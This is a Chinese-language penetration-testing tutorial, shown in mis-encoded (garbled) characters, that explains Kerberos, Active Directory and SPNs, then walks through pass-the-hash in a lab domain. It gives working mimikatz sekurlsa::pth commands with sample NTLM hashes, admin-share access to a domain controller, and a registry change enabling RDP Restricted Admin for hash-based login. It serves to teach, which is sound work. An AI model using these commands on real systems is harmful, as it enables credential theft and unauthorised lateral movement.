è¿›è¡Œè§£å¯†ä¹‹åï¼Œå°±èƒ½å¾—åˆ°TGTç¥¨æ®äº†ã€‚è¿™ä¸ªTGTä¼šåœ¨ä¸€æ®µæ—¶é—´ä¹‹åå¤±æ•ˆï¼Œä¹Ÿæœ‰ä¸€äº›ç¨‹åº(session manager)èƒ½åœ¨ç”¨æˆ·ç™»é™†æœŸé—´è¿›è¡Œè‡ªåŠ¨æ›´æ–°ã€‚ å½“å®¢æˆ·ç«¯ç”¨æˆ·éœ€è¦ä½¿ç”¨ä¸€äº›ç‰¹å®šæœåŠ¡(Kerberosæœ¯è¯­ä¸­ç”¨â€principalâ€è¡¨ç¤º)çš„æ—¶å€™ï¼Œè¯¥å®¢æˆ·ç«¯å°±å‘é€TGTåˆ°KDCæœåŠ¡å™¨ä¸­çš„TGSæœåŠ¡ã€‚å½“è¯¥ç”¨æˆ·çš„TGTéªŒè¯é€šè¿‡å¹¶ä¸”å…¶æœ‰æƒè®¿é—®æ‰€ç”³è¯·çš„æœåŠ¡æ—¶ï¼ŒTGSæœåŠ¡ä¼šç”Ÿæˆä¸€ä¸ªè¯¥æœåŠ¡æ‰€å¯¹åº”çš„ticketå’Œsession keyï¼Œå¹¶å‘è¿˜ç»™å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯å°†æœåŠ¡è¯·æ±‚ä¸è¯¥ticketä¸€å¹¶å‘é€ç»™ç›¸åº”çš„æœåŠ¡ç«¯å³å¯ã€‚å…·ä½“çš„æµç¨‹è¯·çœ‹ä¸‹é¢çš„æè¿°ã€‚ **ADæ´»åŠ¨ç›®å½•** Active Directory(æ´»åŠ¨ç›®å½•)æ¦‚å¿µ ## Windowsæä¾›äº†ä¸ºä¼ä¸šç®¡ç†èµ„äº§ã€æœåŠ¡ã€ç½‘ç»œå¯¹è±¡è¿›è¡Œç»„ç»‡åŒ–çš„ç®¡ç†ï¼Œè¿™éå¸¸ç¬¦åˆä¼ä¸šæ¶æ„çš„ç®¡ç†æ¨¡å¼ã€‚è€Œæ‰¿è½½è¿™äº›ç®¡ç†æœºåˆ¶çš„å°±æ˜¯æ´»åŠ¨ç›®å½•æœåŠ¡ã€‚å¦‚æœè¦æ­å»ºä¸€ä¸ªåŸŸï¼Œå°±éœ€è¦å®‰è£…æ´»åŠ¨ç›®å½•æœåŠ¡ï¼Œå½“ç„¶ï¼Œè¿™ä¸ªä¸åœ¨æˆ‘ä»¬çš„è®¨è®ºèŒƒå›´ã€‚æ´»åŠ¨ç›®å½•æœåŠ¡ä»¥åŸŸåæ¥åˆ’åˆ†åŸŸçš„è¾¹ç•Œï¼ŒåŸŸå¤–å°±ä¸å±äºç®¡ç†èŒƒå›´äº†ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªåŸŸå¯¹åº”ä¸€ä¸ªåŸŸåï¼ŒåŸŸä¹‹é—´ä¹Ÿå¯ä»¥ç›¸äº’ä¿¡ä»»ã€‚Active Directoryå­˜å‚¨äº†æœ‰å…³ç½‘ç»œå¯¹è±¡çš„ä¿¡æ¯ï¼Œå¹¶ä¸”è®©ç®¡ç†å‘˜å’Œç”¨ æˆ·èƒ½å¤Ÿè½»æ¾åœ°æŸ¥æ‰¾å’Œä½¿ç”¨è¿™äº›ä¿¡æ¯ã€‚Active Directoryä½¿ç”¨äº†ä¸€ç§ ç»“æ„åŒ–çš„æ•°æ®å­˜å‚¨æ–¹å¼ï¼Œå¹¶ä»¥æ­¤ä½œä¸ºåŸºç¡€å¯¹ç›®å½•ä¿¡æ¯è¿›è¡Œåˆä¹é€» è¾‘çš„åˆ†å±‚ç»„ç»‡ã€‚ ## ç½‘ç»œå¯¹è±¡åˆ†ä¸º:ç”¨æˆ·ã€ç”¨æˆ·ç»„ã€è®¡ç®—æœºã€åŸŸã€ç»„ç»‡å•ä½ä»¥åŠå®‰å…¨ ç­–ç•¥ç­‰ã€‚Active Directory(æ´»åŠ¨ç›®å½•)åŠŸèƒ½æœåŠ¡å™¨åŠå®¢æˆ·ç«¯è®¡ç®—æœºç®¡ç†:ç®¡ç†æœåŠ¡å™¨åŠå®¢æˆ·ç«¯è®¡ç®—æœºè´¦æˆ·ï¼Œ æ‰€æœ‰æœåŠ¡å™¨åŠå®¢æˆ·ç«¯è®¡ç®—æœºåŠ å…¥åŸŸç®¡ç†å¹¶å®æ–½ç»„ç­–ç•¥ã€‚ ## ç”¨æˆ·æœåŠ¡:ç®¡ç†ç”¨æˆ·åŸŸè´¦æˆ·ã€ç”¨æˆ·ä¿¡æ¯ã€ä¼ä¸šé€šè®¯å½•(ä¸ç”µå­é‚® ä»¶ç³»ç»Ÿé›†æˆ)ã€ç”¨æˆ·ç»„ç®¡ç†ã€ç”¨æˆ·èº«ä»½è®¤è¯ã€ç”¨æˆ·æˆæƒç®¡ç†ç­‰ï¼Œ æŒ‰çœå®æ–½ç»„ç®¡ç†ç­–ç•¥ã€‚ ## èµ„æºç®¡ç†:ç®¡ç†æ‰“å°æœºã€æ–‡ä»¶å…±äº«æœåŠ¡ç­‰ç½‘ç»œèµ„æºã€‚ ## æ¡Œé¢é…ç½®:ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥é›†ä¸­çš„é…ç½®å„ç§æ¡Œé¢é…ç½®ç­–ç•¥ï¼Œå¦‚: ç”¨æˆ·ä½¿ç”¨åŸŸä¸­èµ„æºæƒé™é™åˆ¶ã€ç•Œé¢åŠŸèƒ½çš„é™åˆ¶ã€åº”ç”¨ç¨‹åºæ‰§è¡Œç‰¹ å¾é™åˆ¶ã€ç½‘ç»œè¿æ¥é™åˆ¶ã€å®‰å…¨é…ç½®é™åˆ¶ç­‰ã€‚ ## åº”ç”¨ç³»ç»Ÿæ”¯æ’‘:æ”¯æŒè´¢åŠ¡ã€äººäº‹ã€ç”µå­é‚®ä»¶ã€ä¼ä¸šä¿¡æ¯é—¨æˆ·ã€åŠ å…¬è‡ªåŠ¨åŒ–ã€è¡¥ä¸ç®¡ç†ã€é˜²ç—…æ¯’ç³»ç»Ÿç­‰å„ç§åº”ç”¨ç³»ç»Ÿã€‚åœ¨åŸŸä¸­ï¼Œç½‘ç»œå¯¹è±¡å¯ä»¥ç›¸äº’è®¿é—®ï¼Œä½†æ˜¯åœ¨çœŸå®æƒ…å†µä¸­ï¼Œéœ€è¦å¯¹æŸäº›éƒ¨é—¨çš„è®¡ç®—æœºè¿›è¡Œé™åˆ¶ï¼Œä¾‹å¦‚ï¼šé”€å”®éƒ¨é—¨ä¸èƒ½è®¿é—®æŠ€æœ¯éƒ¨é—¨çš„æœåŠ¡å™¨ã€‚è¿™ä¸ªä¸­é—´å°±éœ€è¦Kerberosè®¤è¯åè®®æ¥éªŒè¯ç½‘ç»œå¯¹è±¡é—´çš„æƒé™ã€‚ **SPN** ä»‹ç» https://zhuanlan.zhihu.com/p/474062138 ## æœåŠ¡ä¸»ä½“åç§°ï¼ˆSPNï¼šServicePrincipal Namesï¼‰æ˜¯æœåŠ¡å®ä¾‹ï¼ˆå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæœåŠ¡ï¼Œæ¯”å¦‚ HTTPã€MSSQLï¼‰çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚Kerberos èº«ä»½éªŒè¯ä½¿ç”¨ SPN å°†æœåŠ¡å®ä¾‹ä¸æœåŠ¡ç™»å½•å¸æˆ·ç›¸å…³è”ã€‚å¦‚æœåœ¨æ•´ä¸ªæ—æˆ–åŸŸä¸­çš„è®¡ç®—æœºä¸Šå®‰è£…å¤šä¸ªæœåŠ¡å®ä¾‹ï¼Œåˆ™æ¯ä¸ªå®ä¾‹éƒ½å¿…é¡»å…·æœ‰è‡ªå·±çš„ SPNã€‚å¦‚æœå®¢æˆ·ç«¯å¯èƒ½ä½¿ç”¨å¤šä¸ªåç§°è¿›è¡Œèº«ä»½éªŒè¯ï¼Œåˆ™ç»™å®šæœåŠ¡å®ä¾‹å¯ä»¥å…·æœ‰å¤šä¸ª SPNã€‚SPN å§‹ç»ˆåŒ…å«è¿è¡ŒæœåŠ¡å®ä¾‹çš„ä¸»æœºçš„åç§°ï¼Œå› æ­¤æœåŠ¡å®ä¾‹å¯ä»¥ä¸ºå…¶ä¸»æœºçš„æ¯ä¸ªåç§°æˆ–åˆ«åæ³¨å†Œ SPNã€‚ ä½œç”¨ ## å½“æŸç”¨æˆ·éœ€è¦è®¿é—®MySQLæœåŠ¡æ—¶ï¼Œç³»ç»Ÿä¼šä»¥å½“å‰ç”¨æˆ·çš„èº«ä»½å‘åŸŸæ§æŸ¥è¯¢SPNä¸ºMySQLçš„è®°å½•ã€‚å½“æ‰¾åˆ°è¯¥SPNè®°å½•åï¼Œç”¨æˆ·ä¼šå†æ¬¡ä¸KDCé€šä¿¡ï¼Œå°†KDCå‘æ”¾çš„TGTä½œä¸ºèº«ä»½å‡­æ®å‘é€ç»™å®¢æˆ·ï¼Œå¹¶å°†éœ€è¦è®¿é—®çš„SPNå‘é€ç»™KDCã€‚ ## KDCä¸­çš„TGSæœåŠ¡å¯¹TGTè¿›è¡Œè§£å¯†ã€‚ç¡®è®¤æ— è¯¯åï¼Œç”±TGSå°†ä¸€å¼ å…è®¸è®¿é—®è¯¥SPNæ‰€å¯¹åº”çš„æœåŠ¡çš„STæœåŠ¡ç¥¨æ®å’Œè¯¥SPNæ‰€å¯¹åº”çš„æœåŠ¡çš„åœ°å€å‘é€ç»™ç”¨æˆ·ï¼Œç”¨æˆ·ä½¿ç”¨è¯¥ç¥¨æ®å³å¯è®¿é—®MySQLæœåŠ¡ã€‚ æŸ¥è¯¢ # æŸ¥çœ‹å½“å‰åŸŸå†…æ‰€æœ‰çš„SPN setspn -q ** åœ¨åŸŸæ§ä¸»æœºä¸Šæ‰§è¡Œï¼Œå°±èƒ½çœ‹åˆ°å¦‚ä¸‹æ•ˆæœ: **è®¤è¯æµç¨‹** AS_REQ(è®¤è¯æœåŠ¡è¯·æ±‚)ï¼š## Clientå‘KDCå‘é€AS_REQï¼Œè¯·æ±‚çš„å‡­æ®æ˜¯Clientçš„hash(è¿™ä¸ªhashæ˜¯æ ¹æ®è¾“å…¥çš„å¯†ç ç”Ÿæˆçš„)åŠ å¯†çš„æ—¶é—´æˆ³ã€‚ AS_REP(è®¤è¯æœåŠ¡å“åº”)ï¼š# KDCå‘å‘å‡ºAS_REQçš„Clientå‘å‡ºå“åº”ï¼Œå»å¦‚æœè®¤è¯æˆåŠŸå°±è¿”å›ä¸€ä¸ªTGT TGS_REQ(ç¥¨æ®å‘æ”¾æœåŠ¡è¯·æ±‚)ï¼š# Clientå‡­å€ŸTGTå‘KDCå‘é€å¯¹æŸä¸€Serverçš„TGS_REQ TGS_REP(ç¥¨æ®å‘æ”¾æœåŠ¡å“åº”)ï¼š# KDCéªŒè¯TGTï¼Œå¦‚æœéªŒè¯æ­£ç¡®å°±æ ¹æ®è¯·æ±‚çš„æœåŠ¡è¿”å›å¯¹åº”çš„TGS,ä¸ç®¡æ˜¯å¦æœ‰æƒå‘è®¿é—®Server AP_REQ(æœåŠ¡è¯·æ±‚)ï¼š# Clientå‡­å€ŸTGSå‘Serverå‘èµ·æœåŠ¡è¯·æ±‚ AP_REP(æœåŠ¡å“åº”)ï¼š# ServeréªŒè¯TGSï¼Œå¦‚æœéªŒè¯æ­£ç¡®å°±å‘KDCè¯¢é—®ï¼ŒClientæ˜¯å¦æœ‰æƒé™è·å¾—æœåŠ¡ï¼Œå¦‚æœæœ‰å°±è¿”å›å“åº” **é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®** ## é»„é‡‘ç¥¨æ®ï¼šå½“é»‘å®¢å¯ä»¥è·å¾—Krbtgtç”¨æˆ·çš„NTLM-Hashå°±ä»£è¡¨ç€é»‘å®¢ä¾¿å¯ä¸»åŠ¨ä½¿ç”¨krbtgtç”¨æˆ·çš„NTLMå“ˆå¸Œåšä¸ºå¯†é’¥æ¥ç”ŸæˆTGTå‘é€ç»™KDCï¼Œè¿™æ ·KDCå¦‚æœå¯ä»¥è§£å¯†å¹¶ä¸”å¯¹æ¯”é‡Œé¢çš„æ•°æ®éƒ½æ²¡é—®é¢˜ï¼Œä¾¿æˆåŠŸéª—è¿‡äº†KDCï¼Œä¹Ÿå°±æ˜¯æˆåŠŸä¼ªé€ äº†é»„é‡‘ç¥¨æ®ã€‚ç™½é“¶ç¥¨æ®ä¸åŒäºé»„é‡‘ç¥¨æ®ï¼Œç™½é“¶ç¥¨æ®çš„åˆ©ç”¨è¿‡ç¨‹æ˜¯ä¼ªé€ TGSï¼Œå¦‚æœè·å–åˆ°äº†è¦è®¿é—®çš„Serverçš„NTLM Hashï¼Œä¾¿å¯ä¼ªé€ Ticketï¼Œä¼ªé€ åç›´æ¥å‘é€ç»™serverï¼Œé‚£ä¹ˆserverä½¿ç”¨è‡ªå·±çš„NTLM Hashæ­£å¸¸è§£å¯†å®Œæˆæ¯”å¯¹ï¼Œä¹Ÿå°±æ˜¯æˆåŠŸä¼ªé€ äº†ç™½é“¶ç¥¨æ®ã€‚ ## é»„é‡‘å’Œç™½é“¶å¯¹æ¯”ï¼š 1. é»„é‡‘ç¥¨æ®ä¼ªé€ ä¹‹åå‘é€ç»™KDCæ¥éªŒè¯ï¼Œå®¹æ˜“ç•™ä¸‹ç—•è¿¹æˆ–è€…è¯´æ—¥å¿—è®°å½• 2. ç™½é“¶ç¥¨æ®çš„éªŒè¯ä¸éœ€è¦ç»è¿‡KDCï¼Œç›´æ¥å‘é€ç»™serverç«¯çš„ï¼Œä¸å®¹æ˜“ç•™ä¸‹ç—•è¿¹æˆ–è€…æ—¥å¿— 3. é€šè¿‡TGTå¯ä»¥ç”³è¯·åˆ°å¤šä¸ªTGSç¥¨æ® 4. ä¸€ä¸ªTGSç¥¨æ®åªèƒ½è®¿é—®ä¸€ä¸ªç‰¹å®šçš„æœåŠ¡ 2-3 PTH**3-1 PTH ä»‹ç»** ## å…¨ç§°ï¼šPass The Hashï¼Œåœ¨NTLM åè®®çš„éªŒè¯è¿‡ç¨‹ä¸­è™½ç„¶æ²¡æœ‰æ˜æ–‡ä¼ é€’å¯†ç ï¼Œä½†æ˜¯å´ä½¿ç”¨äº†æ˜æ–‡å¯†ç çš„ç­‰ä»·ç‰©NTLM Hashï¼Œæ‰€ä»¥åœ¨ä¸çŸ¥é“æ˜æ–‡å¯†ç ä½†æ˜¯è·å–åˆ°NTLM Hashçš„æƒ…å†µå³å¯å®Œæˆèº«ä»½çš„è®¤è¯ï¼Œè¿™ç§è®¤è¯æ–¹å¼å› ä¸ºä¼ é€’çš„æ˜¯hashå€¼æ•…æˆä¸ºå“ˆå¸Œä¼ é€’ã€‚è¦å®Œæˆä¸€ä¸ªNTLMè®¤è¯ï¼Œç¬¬ä¸€æ­¥éœ€è¦å®¢æˆ·ç«¯å°†è‡ªå·±è¦å‚ä¸è®¤è¯çš„ ç”¨æˆ·åå‘é€è‡³æœåŠ¡å™¨ç«¯ï¼Œç­‰å¾…æœåŠ¡å™¨ç«¯ç»™å‡ºçš„Challengeï¼Œç„¶åä½¿ç”¨ç”¨æˆ·åå¯¹åº”çš„NTLM Hashå°†æœåŠ¡å™¨ç»™å‡ºçš„ ChanllengeåŠ å¯†ï¼Œç”Ÿæˆä¸€ä¸ªResponseï¼Œæ¥å®Œæˆè®¤è¯ã€‚Pass The Hashèƒ½å¤Ÿå®Œæˆä¸€ä¸ªä¸éœ€è¦è¾“å…¥å¯†ç çš„NTLMåè®®è®¤è¯æµç¨‹ï¼Œæ‰€ä»¥ä¸ç®—æ˜¯ä¸€ä¸ªæ¼æ´ï¼Œç®—æ˜¯ä¸€ä¸ªæŠ€å·§ã€‚ å“ˆå¸Œä¼ é€’çš„ä½œç”¨æ˜¯ï¼šè§£å†³äº†æˆ‘ä»¬æ¸—é€ä¸­è·å–ä¸åˆ°æ˜æ–‡å¯†ç ã€ç ´è§£ä¸äº†NTLM Hashè€Œåˆæƒ³ç»§ç»­æ¸—é€å…¶ä»–ä¸»æœºçš„é—®é¢˜ã€‚ å®ç°ä¼ é€’çš„å¿…è¦æ¡ä»¶ 1. å“ˆå¸Œä¼ é€’éœ€è¦è¢«è®¤è¯çš„ä¸»æœºèƒ½å¤Ÿè®¿é—®åˆ°æœåŠ¡å™¨ 2. å“ˆå¸Œä¼ é€’éœ€è¦çŸ¥é“å¹¶ä¼ é€’è¢«è®¤è¯ä¸»æœºçš„ç”¨æˆ·å 3. å“ˆå¸Œä¼ é€’éœ€è¦çŸ¥é“å¹¶ä¼ é€’è¢«è®¤è¯ç”¨æˆ·çš„NTLM Hash PTHçš„åˆ©ç”¨å·¥å…·å¾ˆå¤š mimikatzï¼ŒCrackMapExecï¼ŒSmbmapï¼ŒSmbexecï¼ŒMetasploitç­‰ç­‰ PTHåœ¨å†…ç½‘æ¸—é€ä¸­æ˜¯ä¸€ç§å¾ˆç»å…¸çš„æ”»å‡»æ–¹å¼ï¼ŒåŸç†å°±æ˜¯æ”»å‡»è€…å¯ä»¥ç›´æ¥é€šè¿‡LM Hashå’ŒNTLM Hashè®¿é—®è¿œç¨‹ä¸»æœºæˆ–æœåŠ¡ï¼Œè€Œä¸ç”¨æä¾›æ˜æ–‡å¯†ç ã€‚ æ³¨æ„é—®é¢˜ï¼šKB2871997è¡¥ä¸åçš„å½±å“ æ²¡æ‰“è¡¥ä¸ç”¨æˆ·éƒ½å¯ä»¥è¿æ¥ï¼Œæ‰“äº†è¡¥ä¸åªèƒ½administratorè¿æ¥ ä½†æ˜¯è¿˜æœ‰ä¸€ç§æ‰‹æ³•å«åšPTKï¼Œä¸‹é¢æˆ‘ä»¬ä¼šå­¦åˆ° PTKï¼šæ‰“äº†è¿™ä¸ªè¡¥ä¸çš„ï¼Œæ‰èƒ½ä½¿ç”¨æ‰€æœ‰ç”¨æˆ·æ¥è¿æ¥ï¼Œé‡‡ç”¨aes256è¿æ¥ PTHè¿™ç§æ‰‹æ³•åˆ©ç”¨çš„æ˜¯NTMLè®¤è¯åè®®ã€‚ ä¸‹é¢æˆ‘ä»¬æ¥å®éªŒä¸€ä¸‹ ä¸€ã€ä¿¡æ¯æ”¶é›† å…ˆé€šè¿‡mimikatzç­‰å·¥å…·æ”¶é›†ä¸€ä¸‹ä¿¡æ¯ï¼Œé‡ç‚¹æ˜¯æ”¶é›†ç”¨æˆ·çš„NTML hashæ•°æ®ï¼Œæ³¨æ„ï¼Œä½¿ç”¨mimikatzéœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»¥æœ¬åœ°ç®¡ç†å‘˜çš„èº«ä»½å…ˆç™»å½•åˆ°webserverä¸»æœºï¼Œå¹¶æ‰“å¼€powershellæ”¶é›†æœ¬åœ°ç®¡ç†å‘˜å’ŒåŸŸç”¨æˆ·çš„hashå¯†ç ä¿¡æ¯ æœ¬åœ°ç®¡ç†å‘˜çš„ï¼š æœ¬æœºç™»é™†è¿‡çš„åŸŸç”¨æˆ·çš„ï¼š å…¶å®PTHè¿™ä¸ªæ‰‹æ³•å’Œæˆ‘ä»¬å‰é¢è¯´åˆ°çš„hashå£ä»¤ä¼ é€’æ”»å‡»ç”¨èµ·æ¥å·®ä¸å¤šï¼Œåªæ˜¯åŸç†ä¸å¤ªä¸€æ ·è€Œå·²ã€‚è¿™ç§æ”»å‡»æ‰‹æ³•å…¶å®ç®—æ˜¯è¿æ°”æ”»å‡»ï¼Œå› ä¸ºæˆ‘ä»¬è·å–çš„å¯†ç æ˜¯webserverä¸»æœºçš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå¦‚æœåŸŸæ§çš„ç®¡ç†å‘˜ä¹Ÿæ˜¯è¿™ä¸ªå¯†ç ï¼Œé‚£ä¹ˆå°±èƒ½ä¼ é€’æˆåŠŸã€‚ privilege::debug ## åœ¨æœªæ‰“è¡¥ä¸çš„å·¥ä½œç»„åŠåŸŸè¿æ¥ï¼š sekurlsa::pth user:[ç”¨æˆ·å] domain:[åŸŸåæˆ–â€œworkgroupâ€] ntlm:[ntlmçš„å€¼] è¿æ¥åŸŸæ§ï¼šsekurlsa::pth user:administrator domain:god ntlm:ccef208c6485269c20db2cad21734fe7 è¿æ¥sqlserverï¼šsekurlsa::pth user:dbadmin domain:god ntlm:518b98ad4178a53695dc997aa02d455c æœ¬åœ°ç”¨æˆ·è¿æ¥ï¼šsekurlsa::pth user:administrator domain:workgroup ntlm:ccef208c6485269c20db2cad21734fe7 # ä½¿ç”¨æœ¬åœ°ç”¨æˆ·è¿æ¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬domainçš„å€¼ä¸ºworkgroup ç¬¬ä¸€æ­¥ï¼Œå…ˆçœ‹ä¸€ä¸‹åŸŸæ§ä¸»æœºçš„ä¸»æœºåå’ŒåŸŸåï¼Œéšä¾¿æ‰¾ä¸ªä¸»æœºæŸ¥çœ‹ä¸€ä¸‹ï¼Œå¿…é¡»åŸŸç”¨æˆ·ç™»å½•çš„æ‰å¯ä»¥æŸ¥åˆ°æ˜‚ã€‚ å°†è¿™ä¸ªåå­—ä¿å­˜ä¸‹æ¥ï¼Œå› ä¸ºä¸€èˆ¬ä½¿ç”¨PTHæ”»å‡»æ‰‹æ³•çš„è¯éœ€è¦ç”¨è¿™ä¸ªè®¡ç®—æœºåå’ŒåŸŸåï¼Œä¸è¦ç”¨ipåœ°å€ï¼Œå› ä¸ºåŸŸä¸­ä¸»æœºè¯†åˆ«æ˜¯åŸºäºDNSè§£ææ¥æ‰¾çš„ã€‚ \\OWA2010CN-God.god.orgç›´æ¥ä½¿ç”¨æœ¬åœ°ç”¨æˆ·é€šè¿‡åŸŸæ§ä¸»æœºåæ¥è¿æ¥ä¸€ä¸‹åŸŸæ§ä¸»æœºï¼Œçœ‹çœ‹æ•ˆæœï¼š å¤±è´¥äº†ï¼Œå†é€šè¿‡åŸŸæ§ä¸»æœºçš„ipåœ°å€è¿æ¥ä¸€ä¸‹çœ‹æ•ˆæœ ä¹Ÿæ˜¯å¤±è´¥äº†ã€‚å› ä¸ºç›´æ¥è¿æ¥è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºæ²¡æœ‰å‡­æ® **3-2 PTH æ”»å‡»** mimikatz æˆ‘ä»¬é€šè¿‡mimikatzæ¥è¿›è¡Œpthä¼ é€’æ”»å‡»ï¼š æ”»å‡»æˆåŠŸï¼Œå¹¶ä¸”ä¸€ä¼šå„¿ä¼šè‡ªåŠ¨å¼¹å‡ºä¸€ä¸ªshellç»ˆç«¯çª—å£ï¼Œåœ¨å¼¹å‡ºçš„çª—å£ä¸­å°±å¯ä»¥è¿æ¥ä¸ŠåŸŸæ§ä¸»æœºäº†ã€‚å…ˆç”¨ipåœ°å€å°è¯•è¿æ¥ï¼Œè¿™é‡Œå¯ä»¥è¿æ¥ä¸Šï¼Œå¦‚æœä¸èƒ½è¿æ¥çš„è¯ï¼Œå°±æ¢æˆåŸŸæ§ä¸»æœºçš„é‚£ä¸ªä¸»æœºåæ¥è¿æ¥ net use \\192.168.241.21\\c$ dir \\192.168.241.21\\c$ PTHæˆåŠŸï¼Œæ³¨æ„ï¼Œåªèƒ½åœ¨å¼¹å‡ºçš„è¿™ä¸ªçª—å£ä¸­æ‰èƒ½è¿æ¥æ˜‚ã€‚ å¥½ï¼Œå·²ç»è¿æ¥ä¸ŠåŸŸæ§ä¸»æœºäº†ï¼Œé‚£ä¹ˆå°±å¯ä»¥åƒatæˆ–è€…schtasksçš„æ”»å‡»æ–¹å¼ä¸€æ ·äº†ï¼Œå¤åˆ¶æ–‡ä»¶ã€æ‰§è¡Œæ–‡ä»¶æ¥æ§åˆ¶åŸŸæ§ä¸»æœºäº†ã€‚ è¿™æ¬¡æ”»å‡»èƒ½å¤ŸæˆåŠŸçš„åŸå› æ˜¯ï¼ŒåŸŸæ§ä¸»æœºä¸Šæœ‰è¿™ä¸ªadministratorç”¨æˆ·ï¼Œå¹¶ä¸”NTLM hashå¯†ç å’Œwebä¸»æœºçš„ä¸€æ ·ï¼Œæ‰€ä»¥å±äºè¿æ°”æ”»å‡»ã€‚å…¶å®æˆ‘ä»¬ç›®å‰çš„å®éªŒç¯å¢ƒä¸‹ï¼ŒåŸŸæ§ä¸»æœºçš„administratorç”¨æˆ·çš„hashå¯†ç åœ¨webä¸»æœºä¸Šæ˜¯æ²¡æœ‰çš„ï¼Œæˆ‘ä¸ºäº†ç»™å¤§å®¶æ¼”ç¤ºæ•ˆæœæ‰è¿™æ ·è®¾è®¡çš„ï¼Œå‰æœŸè¿˜æ˜¯éœ€è¦æˆ‘ä»¬ä¸€æ­¥ä¸€æ­¥çš„ä¿¡æ¯æ”¶é›†ï¼Œæ”¶é›†åˆ°åŸŸæ§ä¸»æœºçš„hashå¯†ç ã€‚ **3-3 RDPçš„PTHæ”»å‡»** ## å½“é‡åˆ°ç›®æ ‡ä¸»æœºæ— æ³•é€šè¿‡lsass.exeè¿›ç¨‹æŠ“å–æ˜æ–‡å¯†ç ï¼Œæˆ–è€…æ˜¯å¯†ç å¼ºåº¦å¤ªå¤§ç»å¸¸ä¼šé‡åˆ°æ‹¿åˆ°hashå´è§£ä¸å¼€çš„æƒ…å†µï¼Œæˆ‘ä»¬å°±å¯ä»¥é‡‡ç”¨å‡­æ®ä¼ é€’æ”»å‡»ï¼ˆPass-The-Hashï¼‰ã€‚ ## æ–°ç‰ˆçš„RDPè¿œç¨‹æ¡Œé¢åè®®ä¸­æœ‰ä¸€ä¸ªâ€œå—é™ç®¡ç†å‘˜â€ï¼ˆRestricted Adminï¼‰çš„ç‰¹æ€§ï¼Œé€šè¿‡è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°å“ˆå¸Œä¼ é€’æ”»å‡»å¹¶æˆåŠŸç™»å½•è¿œç¨‹æ¡Œé¢ã€‚æ‰€ä»¥åœ¨å¼€å¯å‡­æ®ä¼ é€’æ”»å‡»ï¼ˆPass-The-Hashï¼‰å‰ï¼Œè¦å…ˆç¡®ä¿ç›®æ ‡ä¸»æœºå¼€å¯äº†Restricted Admin Modeï¼Œå¼€å¯åæˆ‘ä»¬ä¾¿å¯ä»¥ä½¿ç”¨Hashæ¥ç›´æ¥å®ç°RDPè¿œç¨‹ç™»å½•ã€‚ ## windows Serveréœ€è¦å¼€å¯Restricted Admin modeï¼Œåœ¨Windows 8.1å’ŒWindows Server 2012 R2ä¸­é»˜è®¤å¼€å¯ï¼ŒåŒæ—¶å¦‚æœWin 7å’ŒWindows Server 2008 R2å®‰è£…äº†2871997ã€2973351è¡¥ä¸ä¹Ÿæ”¯æŒã€‚å‰é¢æˆ‘ä»¬è®²è¿‡RDPçš„æš´åŠ›ç ´è§£ã€3389ç«¯å£çš„æ¢æµ‹å’ŒæŸ¥è¯¢(netstat -anoç­‰)å’Œå¼€å¯æ‰‹æ³•ç­‰ã€‚ ## å…³äºä¸ç›®æ ‡ä¸»æœºå»ºç«‹è¿æ¥çš„æ–¹å¼æˆ‘ä»¬å‰é¢æåˆ°è¿‡IPCã€WMIã€SMBç­‰åè®®çš„è¿æ¥ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å†è¯´ä¸€ä¸ªRDPåè®®çš„è¿æ¥ã€‚æ”¯æŒæ˜æ–‡å’Œhashä¼ é€’è¿æ¥ã€‚ ## æˆ‘ä»¬åœ¨æ¸—é€è¿‡ç¨‹ä¸­å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹å¼å¼€å¯ç›®æ ‡ä¸»æœºçš„Restricted Admin Modeï¼Œå€¼ä¸º0ä»£è¡¨å¼€å¯ï¼Œå€¼ä¸º1ä»£è¡¨å…³é—­ï¼š REG ADD â€œHKLMSystemCurrentControlSetControlLsaâ€ v DisableRestrictedAdmin t REG_DWORD d 00000000 f ## æŸ¥çœ‹æ˜¯å¦æˆåŠŸå¼€å¯: REG query â€œHKLMSystemCurrentControlSetControlLsaâ€ | findstr â€œDisableRestrictedAdminâ€ RDP æ˜æ–‡è¿æ¥ Windowsï¼šmstscï¼ˆè¿œç¨‹æ¡Œé¢è¿æ¥ï¼‰-è¾“å…¥è´¦å·å¯†ç  Windowså‘½ä»¤è¡Œï¼šmstsc.exe console v:[IP] admin Linuxï¼šï¼ˆéœ€è¦å®‰è£…rdesktopï¼‰rdesktop [IP] å®éªŒå¼€å§‹ï¼Œæ¯”å¦‚æˆ‘ä»¬ä½¿ç”¨hashä¼ é€’ï¼Œè®©webserverä¸»æœºè¿æ¥ä¸€ä¸‹sqlserver2012ä¸»æœºã€‚ å…ˆå¼€å¯sqlserverä¸»æœºçš„è¿œç¨‹è¿æ¥ æŸ¥çœ‹sqlserverä¸»æœºçš„ipåœ°å€ è·å–sqlserverçš„hashå¯†ç å’Œç”¨æˆ·å * Username : Administrator * Domain : SQLSERVER * NTLM : 518b98ad4178a53695dc997aa02d455c * SHA1 : 39aa99a9e2a53ffcbe1b9eb411e8176681d01c39 ä½¿ç”¨webserverä¸»æœºçš„è¿œç¨‹æ¡Œé¢ å…ˆçœ‹çœ‹æ˜æ–‡è¿æ¥ ç­‰ä¸€ä¼šå„¿å°±è¿æ¥ä¸Šäº† RDP HASHè¿æ¥ mstsc.exe restrictedadmin mimikatz.exe privilege::debug sekurlsa::pth user:administrator domain:SQLSERVER ntlm:518b98ad4178a53695dc997aa02d455c â€œrun:mstsc.exe restrictedadminâ€ çœ‹åˆ°ä¸Šé¢çš„çª—å£è¡¨ç¤ºæˆ‘ä»¬å½“å‰çš„æ”»å‡»ä¸»æœºç³»ç»Ÿä¸æ”¯æŒRestricted Admin 